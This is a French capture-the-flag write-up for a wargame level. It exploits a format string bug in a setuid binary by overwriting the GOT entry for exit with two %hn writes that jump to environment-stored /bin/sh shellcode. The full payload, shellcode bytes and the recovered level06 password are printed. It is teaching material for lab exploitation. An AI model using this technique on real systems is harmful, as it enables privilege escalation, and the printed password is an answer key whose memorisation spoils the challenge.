# Level05

### Repérage

```
ls -la
-rwsr-s---+ 1 level06 users 5176 Sep 10 2016 level05
```

Le bit setuid (s) + propriétaire level06 → le binaire s'exécute avec les droits de level06, même lancé par level05. C'est ce qui nous intéresse : si on obtient une exécution de code, elle tournera en level06.

### Analyse Ghidra

```
fgets((char *)local_78,100,stdin);      // entrée user
...
printf((char *)local_78);               // printf sur buffer controlé par le user = faille format string
exit(0);
```

Deux observations clés :

- printf(buffer) sans format fixe : le buffer vient de fgets, donc on peut y injecter des directives (%x, %n…) que printf va interpréter. C'est la faille format string.

- Filtre maj/min avant le printf : `if (('@' < c) && (c < '[')) c ^= 0x20;`
@=0x40, [=0x5b -> intervalle 0x41–0x5a = A–Z. Chaque majuscule devient minuscule.
Conséquence : notre shellcode ne peut pas être dans le buffer (il serait corrompu) → on le mettra dans l'environnement.

### Offset

L'offset est la position, dans la liste des arguments lus par printf sur la pile, à laquelle se trouve le début de notre buffer. C'est l'index qu'on passe à `%x` ou `%n` pour pointer précisément sur nos octets.

```
echo 'AAAA %x %x %x %x %x %x %x %x %x %x' %x %x %x | ./level05
aaaa 64 ... 61616161 ...
                10e position = 0x61616161 = "aaaa"
```

AAAA (0x41) ressortent en aaaa (0x61) car le filtre maj/min agit sur le début du buffer. Il faudra donc vérifier que les octets de l'adresse GOT qu'on place en tête ne tombent pas dans 0x41–0x5a.

Le 10e %x relit nos 4 octets, donc offset = 10

### Cible : GOT de exit

```
objdump -R ./level05
...
080497e0 R_386_JUMP_SLOT   exit
...
```

GOT de exit = 0x080497e0. Ses octets (e0 97 04 08) sont tous hors 0x41–0x5a, donc non corrompus par le filtre min/maj

Pourquoi exit :
- Dans le code, exit(0) est appelé juste après le printf vulnérable. Si on écrase l'entrée GOT de exit par l'adresse de notre shellcode, alors au moment où le programme veut sortir, il saute sur le shellcode à la place. Pas besoin de revenir dans main.

### Shellcode en environnement

Le shellcode va dans une variable d'env (pas dans le buffer, pour echapper au filtre maj/min)

```
export SHELLCODE=$(python -c 'import sys; sys.stdout.write("\x90"*50000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
```

- python write interprète \x90 comme l'octet réel 0x90 alors q'un export VAR="\x90" en bash direct garderait les caractères littéraux \, x, 9, 0. D'où le passage par Python.
- \x90 = NOP (No Operation). *50000 = un « NOP-sled » de 50 000 octets. Si on atterrit n'importe où dans ce tapis, le CPU glisse de NOP en NOP jusqu'au shellcode. Donc pas besoin d'une adresse chirurgicale, on se donne une grande marge d'erreur.
- Limite ARG_MAX : un sled trop gros (ex. 200 000) fait échouer le lancement avec Argument list too long (l'environnement dépasse la taille max). 50 000 passe.

### Récupérer l'adresse du shellcode

```
cat > /tmp/ge.c << 'EOF'
#include <stdlib.h>
#include <stdio.h>
int main(int argc, char **argv) {
    printf("%p\n", getenv(argv[1]));
    return 0;
}
EOF

gcc -m32 -o /tmp/ge /tmp/ge.c
/tmp/ge SHELLCODE
0xffff15a0
```

- Pourquoi pas gdb : sous gdb, l'environnement est décalé (gdb ajoute ses variables, argv[0] diffère) donc l'adresse vue en gdb ne correspond pas à l'exécution réelle. Et surtout : gdb fait perdre le setuid, donc même un exploit réussi sous gdb resterait en level05. On mesure et on exploite hors gdb.
- Nuance argv[0] : /tmp/ge (helper) et ./level05 (cible) n'ont pas la même longueur de nom. Ca provoque un petit décalage de quelques octets sur l'adresse d'env. Absorbé par les NOP.

### Écriture GOT

Point clé découvert à l'exécution.
L'idée initiale était %n (écriture 32 bits en un coup). Mais l'adresse cible (~0xffff...) impose une largeur de padding de presque 4,3 milliards de caractères : ingérable en pratique sur cette VM (le %n ne se comporte pas correctement / n'aboutit pas).

Solution retenue : deux écritures de 16 bits avec le modificateur short %hn.

Principe : on écrit l'adresse en deux moitiés dans deux emplacements GOT consécutifs :

`0x080497e0` 2 octets de poids faible de l'adresse shellcode (position 10)
`0x080497e2` 2 octets de poids fort (position 11)

`%hn` écrit le nombre de caractères déjà imprimés (modulo 0x10000). Comme le compteur ne se réinitialise pas entre les deux %hn, on imprime d'abord la plus petite des deux valeurs, puis on complète jusqu'à la plus grande.

### Calcul des paddings

```
exemple avec l'adresse mesurée 0xffff15a0

LOW  = 0x15a0 = 5536
HIGH = 0xffff = 65535
LOW < HIGH -> on écrit LOW d'abord

padding1 = LOW - 8 = 5536 - 8 = 5528
// (les 8 = les 2 adresses déjà en tête de buffer)
padding2 = HIGH - LOW = 65535 - 5536 = 59999
```

Si LOW > HIGH (selon l'adresse), il faut inverser l'ordre et écrire la moitié haute en premier, sinon padding2 devient négatif.

### Payload

```
python -c "print <moitié basse GOT exit> + <moitié haute GOT exit> + '%<padding1>d%10\$hn' + '%<padding2>d%11\$hn'" | ./level05
```
- moitié basse GOT exit = \xe0\x97\x04\x08 (0x080497e0, little-endian) reçoit LOW
- moitié haute GOT exit = \xe2\x97\x04\x08 (0x080497e2) reçoit HIGH



### Injection final

```
(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%5528d%10\$hn' + '%59999d%11\$hn'"; cat) | ./level05

whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

